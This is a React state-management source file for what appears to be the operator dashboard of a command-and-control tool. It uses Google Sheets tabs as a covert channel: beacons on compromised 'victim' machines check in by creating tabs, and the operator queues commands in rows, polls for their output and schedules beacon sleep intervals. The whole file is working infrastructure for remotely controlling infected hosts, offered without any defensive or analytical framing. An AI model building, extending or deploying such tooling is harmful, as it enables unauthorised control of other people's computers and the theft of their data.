import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import axios from 'axios';

const AppContext = createContext(null);

// How often the UI re-reads the sheet while waiting for command output (ms)
export const POLL_INTERVAL_MS = 10000;
// How often to refresh the victims list (new sheet tabs / beacons)
const VICTIMS_POLL_INTERVAL_MS = 60000;
// Pause auto-polling after Google quota errors (ms)
const QUOTA_BACKOFF_MS = 90000;
// Stop polling after this many attempts (e.g. 45 × 10s ≈ 7.5 min)
const MAX_POLL_ATTEMPTS = 45;

function getApiErrorMessage(e) {
  return e?.response?.data?.error || e?.message || '';
}

function isQuotaError(e) {
  const msg = getApiErrorMessage(e);
  return /quota exceeded/i.test(msg) || /rate limit/i.test(msg);
}

export function AppProvider({ children }) {
  const [config, setConfig] = useState({
    sheetId: '', hasServiceAccount: false,
  });
  const [configLoaded, setConfigLoaded] = useState(false);
  const [configError, setConfigError]   = useState(null);

  const [victims, setVictims]           = useState([]);
  const [activeVictim, setActiveVictim] = useState(null);
  const [rowsByVictim, setRowsByVictim] = useState({});
  const [loading, setLoading]           = useState(false);
  const [error, setError]               = useState(null);
  const [ticker, setTicker]             = useState(60);
  const [autoRefresh, setAutoRefresh]   = useState(false);
  const [lastRefresh, setLastRefresh]   = useState(null);
  const [showSettings, setShowSettings] = useState(false);
  const [sleepStatus, setSleepStatus]   = useState({});
  const [victimStatus, setVictimStatus] = useState({});
  // Per-victim: rowIndex we are waiting on (victim can poll while another is selected)
  const [pollingByVictim, setPollingByVictim] = useState({});
  const pollTimersRef = useRef({});
  const pollCountByVictimRef = useRef({});
  const pollCallbacksRef = useRef({});
  const sleepWakeTimersRef = useRef({});
  const activeVictimRef = useRef(activeVictim);
  const victimsRef = useRef(victims);
  const rowsByVictimRef = useRef(rowsByVictim);
  const quotaPausedUntilRef = useRef(0);
  const statusProbeRunningRef = useRef(false);

  const victimKey = (id) => String(id);
  const activeRows = activeVictim
    ? (rowsByVictim[victimKey(activeVictim.id)] || [])
    : [];
  const activePendingRow = activeVictim
    ? (pollingByVictim[victimKey(activeVictim.id)] ?? null)
    : null;
  const activePolling = activePendingRow != null;

  useEffect(() => { activeVictimRef.current = activeVictim; }, [activeVictim]);
  useEffect(() => { victimsRef.current = victims; }, [victims]);
  useEffect(() => { rowsByVictimRef.current = rowsByVictim; }, [rowsByVictim]);

  const isQuotaPaused = useCallback(() => Date.now() < quotaPausedUntilRef.current, []);

  const handleQuotaError = useCallback((e) => {
    if (!isQuotaError(e)) return false;
    quotaPausedUntilRef.current = Date.now() + QUOTA_BACKOFF_MS;
    setError(
      'Google Sheets read limit reached. Auto-refresh paused for 90 seconds — wait or use Refresh sparingly.',
    );
    return true;
  }, []);

  // ── Load config from options.yml ──────────────────────────────────────────
  const fetchConfig = useCallback(async () => {
    try {
      const res = await axios.get('/api/config');
      setConfig(res.data);
      setConfigError(null);
      setConfigLoaded(true);
    } catch (e) {
      setConfigError(e.response?.data?.error || e.message);
      setConfigLoaded(true);
    }
  }, []);

  useEffect(() => { fetchConfig(); }, []);

  const isConfigured = configLoaded && config.hasServiceAccount && !!config.sheetId;

  const saveConfig = useCallback(async (updates) => {
    try {
      await axios.post('/api/config', updates);
      await fetchConfig();
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    }
  }, [fetchConfig]);

  // ── Core fetch rows (returns the rows array so polling can inspect it) ────
  const setVictimOnline = useCallback((victimId, online) => {
    setVictimStatus((prev) => ({
      ...prev,
      [victimId]: online ? 'online' : 'offline',
    }));
  }, []);

  const fetchRowsRaw = useCallback(async (victim) => {
    if (!victim || !isConfigured) return null;
    if (isQuotaPaused()) return null;
    try {
      const res = await axios.get('/api/sheets/rows', {
        params: { sheetName: victim.title },
      });
      const fetched = res.data.rows || [];
      setRowsByVictim((prev) => ({ ...prev, [victimKey(victim.id)]: fetched }));
      if (victimKey(activeVictimRef.current?.id) === victimKey(victim.id)) {
        setLastRefresh(new Date());
      }
      setVictimOnline(victim.id, true);
      setSleepStatus((prev) => {
        const sleepEntry = prev[victim.id];
        if (!sleepEntry || sleepEntry.state === 'ready') return prev;
        if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
        if (sleepEntry.rowIndex) {
          const sleepRow = fetched.find((r) => r.rowIndex === sleepEntry.rowIndex);
          if (!sleepRow?.output) return prev;
        }
        return {
          ...prev,
          [victim.id]: { ...sleepEntry, state: 'ready' },
        };
      });
      return fetched;
    } catch (e) {
      if (!handleQuotaError(e)) {
        setError(getApiErrorMessage(e));
      }
      setSleepStatus((prev) => {
        const sleepEntry = victim?.id ? prev[victim.id] : null;
        if (!sleepEntry || sleepEntry.state === 'waiting') return prev;
        if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
        return {
          ...prev,
          [victim.id]: { ...sleepEntry, state: 'waiting' },
        };
      });
      setVictimOnline(victim?.id, false);
      return null;
    }
  }, [isConfigured, setVictimOnline, isQuotaPaused, handleQuotaError]);

  const fetchRowsForVictim = useCallback(async (victim) => {
    if (!victim || !isConfigured || isQuotaPaused()) return null;
    try {
      const res = await axios.get('/api/sheets/rows', {
        params: { sheetName: victim.title },
      });
      return res.data.rows || [];
    } catch (e) {
      handleQuotaError(e);
      return null;
    }
  }, [isConfigured, isQuotaPaused, handleQuotaError]);

  const fetchRows = useCallback(async (victim = activeVictimRef.current, { includeTicker = true } = {}) => {
    if (!victim || !isConfigured) return;
    if (isQuotaPaused()) return;
    setLoading(true);
    try {
      const fetched = await fetchRowsRaw(victim);
      if (includeTicker && fetched) {
        try {
          const tr = await axios.get('/api/sheets/ticker', {
            params: { sheetName: victim.title },
          });
          setTicker(tr.data.ticker || 60);
        } catch (e) {
          handleQuotaError(e);
        }
      }
    } finally {
      setLoading(false);
    }
  }, [isConfigured, fetchRowsRaw, isQuotaPaused, handleQuotaError]);

  const stopPollingForVictim = useCallback((victimId) => {
    const key = String(victimId);
    if (pollTimersRef.current[key]) {
      clearInterval(pollTimersRef.current[key]);
      delete pollTimersRef.current[key];
    }
    delete pollCountByVictimRef.current[key];
    delete pollCallbacksRef.current[key];
    setPollingByVictim((prev) => {
      if (prev[key] == null && prev[victimId] == null) return prev;
      const next = { ...prev };
      delete next[key];
      delete next[victimId];
      return next;
    });
  }, []);

  const stopAllPolling = useCallback(() => {
    Object.keys(pollTimersRef.current).forEach((id) => stopPollingForVictim(id));
  }, [stopPollingForVictim]);

  // Polls the victim's sheet until targetRow has output (independent per victim)
  const startPollingForVictim = useCallback((victimId, targetRowIndex, { onOutput } = {}) => {
    const key = String(victimId);
    stopPollingForVictim(key);

    pollCountByVictimRef.current[key] = 0;
    pollCallbacksRef.current[key] = onOutput || null;
    setPollingByVictim((prev) => ({ ...prev, [key]: targetRowIndex }));

    pollTimersRef.current[key] = setInterval(async () => {
      pollCountByVictimRef.current[key] = (pollCountByVictimRef.current[key] || 0) + 1;

      const victim = victimsRef.current.find((v) => String(v.id) === key);
      if (!victim) {
        stopPollingForVictim(key);
        return;
      }
      if (isQuotaPaused()) return;

      const fetched = await fetchRowsRaw(victim);

      if (fetched) {
        const targetRow = fetched.find((r) => r.rowIndex === targetRowIndex);
        if (targetRow?.output) {
          const done = pollCallbacksRef.current[key];
          stopPollingForVictim(key);
          done?.();
          return;
        }
      }

      if (pollCountByVictimRef.current[key] >= MAX_POLL_ATTEMPTS) {
        stopPollingForVictim(key);
      }
    }, POLL_INTERVAL_MS);
  }, [fetchRowsRaw, stopPollingForVictim, isQuotaPaused]);

  const parseSleepDuration = (value) => {
    if (!value) return null;
    const trimmed = value.trim();
    const regexp = /(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/i;
    const matched = trimmed.match(regexp);
    if (!matched) return null;
    const hours = Number(matched[1] || 0);
    const minutes = Number(matched[2] || 0);
    const seconds = Number(matched[3] || 0);
    const total = hours * 3600000 + minutes * 60000 + seconds * 1000;
    return total > 0 ? total : null;
  };

  const parseHHMMSS = (value) => {
    if (!value) return null;
    const parts = value.trim().split(':');
    if (parts.length !== 3) return null;
    const h = Number(parts[0]);
    const m = Number(parts[1]);
    const s = Number(parts[2]);
    if (isNaN(h) || isNaN(m) || isNaN(s)) return null;
    if (m >= 60 || s >= 60) return null;
    const ms = h * 3600000 + m * 60000 + s * 1000;
    return ms > 0 ? ms : null;
  };

  // ── Send a command ────────────────────────────────────────────────────────
  const sendCommand = useCallback(async (command) => {
    const victim = activeVictimRef.current;
    if (!victim || !isConfigured) return false;

    const victimId = victim.id;
    const victimKey = String(victimId);

    try {
      stopPollingForVictim(victimKey);

      const victimRows = rowsByVictimRef.current[victimKey]
        || rowsByVictimRef.current[victimId]
        || [];
      const cmdRows = victimRows.filter(
        (r) => r.command && r.command !== 'Delay configuration (sec)',
      );
      const nextRowIndex = cmdRows.length + 1;
      const trimmed = command.trim();
      const sleepCommand = trimmed.toLowerCase().startsWith('sleep ');
      const finishCommand = trimmed.toLowerCase() === 'finish';
      let sleepMs = null;
      const activeSleep = sleepStatus?.[victimId]
        && new Date(sleepStatus[victimId].wakeAt) > new Date();

      if (finishCommand) {
        setError('Use direct sleep command only, e.g. sleep 00:02:00.');
        return false;
      }

      if (sleepCommand) {
        const durationString = trimmed.substring(6).trim();
        sleepMs = parseHHMMSS(durationString) || parseSleepDuration(durationString);
        if (sleepMs === null) {
          setError('Invalid sleep format. Use HH:MM:SS (e.g., 00:02:00) or examples like 10s, 5m, 1h30m.');
          return false;
        }
      }

      await axios.post('/api/sheets/command', {
        sheetName: victim.title,
        command,
        rowIndex: nextRowIndex,
      });

      await fetchRowsRaw(victim);

      if (sleepCommand && sleepMs !== null) {
        const wakeAt = new Date(Date.now() + sleepMs);
        setSleepStatus((prev) => ({
          ...prev,
          [victimId]: {
            wakeAt,
            duration: trimmed.substring(6).trim(),
            command: trimmed,
            rowIndex: nextRowIndex,
            state: 'sleeping',
          },
        }));
        setVictimOnline(victimId, true);
      } else if (!activeSleep) {
        startPollingForVictim(victimKey, nextRowIndex);
      }

      return true;
    } catch (e) {
      setError(e.response?.data?.error || e.message);
      return false;
    }
  }, [
    isConfigured,
    fetchRowsRaw,
    startPollingForVictim,
    stopPollingForVictim,
    sleepStatus,
    parseHHMMSS,
  ]);

  // ── Victims ───────────────────────────────────────────────────────────────
  const fetchVictims = useCallback(async ({ silent = false } = {}) => {
    if (!isConfigured) return;
    if (silent && isQuotaPaused()) return;
    try {
      if (!silent) {
        setLoading(true);
        setError(null);
      }
      const res = await axios.get('/api/sheets/tabs');
      const tabs = res.data.tabs || [];
      setVictims(tabs);

      const current = activeVictimRef.current;
      if (!current && tabs.length > 0) {
        setActiveVictim(tabs[tabs.length - 1]);
      } else if (current) {
        const still = tabs.find((t) => t.id === current.id);
        if (still) {
          setActiveVictim(still);
        } else if (tabs.length > 0) {
          setActiveVictim(tabs[tabs.length - 1]);
        } else {
          setActiveVictim(null);
        }
      }
    } catch (e) {
      if (!handleQuotaError(e) && !silent) {
        setError(getApiErrorMessage(e));
      }
    } finally {
      if (!silent) setLoading(false);
    }
  }, [isConfigured, isQuotaPaused, handleQuotaError]);

  const deleteVictim = useCallback(async (victim) => {
    if (!victim || !isConfigured) return false;
    try {
      setError(null);
      await axios.delete('/api/sheets/tab', {
        data: { sheetTabId: victim.id },
      });

      const victimId = victim.id;
      const remaining = victimsRef.current.filter((v) => v.id !== victimId);
      setVictims(remaining);

      setSleepStatus((prev) => {
        const next = { ...prev };
        delete next[victimId];
        return next;
      });
      setVictimStatus((prev) => {
        const next = { ...prev };
        delete next[victimId];
        return next;
      });

      stopPollingForVictim(String(victimId));
      setRowsByVictim((prev) => {
        const next = { ...prev };
        delete next[String(victimId)];
        delete next[victimId];
        return next;
      });

      if (String(activeVictimRef.current?.id) === String(victimId)) {
        setActiveVictim(remaining.length > 0 ? remaining[remaining.length - 1] : null);
      }

      return true;
    } catch (e) {
      setError(e.response?.data?.error || e.message);
      return false;
    }
  }, [isConfigured, stopPollingForVictim]);

  const updateTicker = useCallback(async (value) => {
    if (!activeVictimRef.current || !isConfigured) return;
    try {
      await axios.post('/api/sheets/ticker', {
        sheetName: activeVictimRef.current.title,
        ticker: value,
      });
      setTicker(value);
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    }
  }, [isConfigured]);

  // When wakeAt elapses, update status and poll the sheet until sleep output appears
  const resolveSleepWake = useCallback(async (victimId, rowIndex) => {
    const victim = victimsRef.current.find((v) => String(v.id) === String(victimId));
    if (!victim || !isConfigured) return;

    const isActive = String(activeVictimRef.current?.id) === String(victimId);
    const rowsForVictim = isActive
      ? await fetchRowsRaw(victim)
      : await fetchRowsForVictim(victim);

    const markSleepReady = () => {
      setSleepStatus((prev) => {
        const entry = prev[victimId];
        if (!entry || entry.state === 'ready') return prev;
        return { ...prev, [victimId]: { ...entry, state: 'ready' } };
      });
      setVictimOnline(victimId, true);
    };

    if (rowsForVictim) {
      const targetRow = rowIndex
        ? rowsForVictim.find((r) => r.rowIndex === rowIndex)
        : null;
      const hasOutput = !!targetRow?.output;

      if (hasOutput) {
        markSleepReady();
      } else if (isActive && rowIndex) {
        startPollingForVictim(String(victimId), rowIndex, { onOutput: markSleepReady });
      } else {
        markSleepReady();
      }
    } else {
      setSleepStatus((prev) => {
        const entry = prev[victimId];
        if (!entry || entry.state === 'waiting') return prev;
        return { ...prev, [victimId]: { ...entry, state: 'waiting' } };
      });
      setVictimOnline(victimId, false);
    }
  }, [isConfigured, fetchRowsForVictim, fetchRowsRaw, setVictimOnline, startPollingForVictim]);

  // Schedule one timer per victim at wakeAt (replaces coarse 10s polling)
  useEffect(() => {
    const timers = sleepWakeTimersRef.current;

    for (const victimId of Object.keys(timers)) {
      const entry = sleepStatus[victimId];
      if (!entry || entry.state !== 'sleeping') {
        clearTimeout(timers[victimId]);
        delete timers[victimId];
      }
    }

    for (const [victimId, entry] of Object.entries(sleepStatus)) {
      if (!entry || entry.state !== 'sleeping') continue;

      const ms = new Date(entry.wakeAt).getTime() - Date.now();
      const rowIndex = entry.rowIndex;
      if (ms <= 0) {
        resolveSleepWake(victimId, rowIndex);
        continue;
      }

      if (timers[victimId]) clearTimeout(timers[victimId]);
      timers[victimId] = setTimeout(() => {
        delete timers[victimId];
        resolveSleepWake(victimId, rowIndex);
      }, ms);
    }
  }, [sleepStatus, resolveSleepWake]);

  useEffect(() => () => {
    Object.values(sleepWakeTimersRef.current).forEach(clearTimeout);
    sleepWakeTimersRef.current = {};
  }, []);

  // ── Effects ───────────────────────────────────────────────────────────────
  // Poll Google Sheets for new victim tabs (beacons create a tab on check-in)
  useEffect(() => {
    if (!isConfigured) return;
    fetchVictims();
    const id = setInterval(() => {
      if (document.hidden) return;
      fetchVictims({ silent: true });
    }, VICTIMS_POLL_INTERVAL_MS);
    return () => clearInterval(id);
  }, [isConfigured, fetchVictims]);

  useEffect(() => {
    if (!activeVictim) return;
    const cached = rowsByVictimRef.current[String(activeVictim.id)]
      ?? rowsByVictimRef.current[activeVictim.id];
    if (cached) {
      setLastRefresh(new Date());
    } else {
      fetchRows(activeVictim);
    }
  }, [activeVictim?.id, fetchRows]);

  // Auto-refresh (manual toggle)
  useEffect(() => {
    if (!autoRefresh || !activeVictim) return;
    const id = setInterval(() => {
      if (document.hidden || isQuotaPaused()) return;
      fetchRows(activeVictim, { includeTicker: false });
    }, ticker * 1000);
    return () => clearInterval(id);
  }, [autoRefresh, ticker, activeVictim, fetchRows, isQuotaPaused]);

  useEffect(() => () => stopAllPolling(), [stopAllPolling]);

  return (
    <AppContext.Provider value={{
      config, saveConfig, fetchConfig,
      configLoaded, configError,
      victims, activeVictim, setActiveVictim,
      rows: activeRows,
      fetchRows,
      loading,
      error, setError,
      ticker, updateTicker,
      autoRefresh, setAutoRefresh,
      lastRefresh,
      sendCommand,
      fetchVictims,
      deleteVictim,
      isConfigured,
      showSettings, setShowSettings,
      sleepStatus,
      victimStatus,
      parseHHMMSS,
      polling: activePolling,
      pendingRow: activePendingRow,
      pollIntervalMs: POLL_INTERVAL_MS,
    }}>
      {children}
    </AppContext.Provider>
  );
}

export const useApp = () => useContext(AppContext);
